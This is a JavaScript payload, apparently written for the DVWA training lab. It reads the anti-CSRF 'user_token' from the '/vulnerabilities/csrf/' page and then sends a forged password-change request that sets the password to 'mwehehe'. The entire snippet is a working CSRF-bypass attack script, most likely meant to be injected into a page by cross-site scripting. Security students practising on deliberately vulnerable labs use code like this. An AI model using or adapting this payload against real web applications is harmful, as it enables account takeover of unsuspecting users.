var req = new XMLHttpRequest();
req.open('GET', '/vulnerabilities/csrf/', true);
req.onload = function () {
    var html = this.responseText;
    var regex = /name=['"]user_token['"] value=['"](.+?)['"]/;
    var match = html.match(regex);
    if (!match) {
        console.error("CSRF token was not found in the page!");
        console.log("Page HTML:", html);
        return;
    }
    var token = match[1];
    console.log("CSRF token found:", token);
    var changeReq = new XMLHttpRequest();
    changeReq.open('GET', '/vulnerabilities/csrf/index.php?password_new=mwehehe&password_conf=mwehehe&Change=Change&user_token=' + encodeURIComponent(token), true);
    changeReq.send();
    console.log("Password change request sent!");
};
req.onerror = function () {
    console.error("Failed to fetch the CSRF page!");
};
req.send();
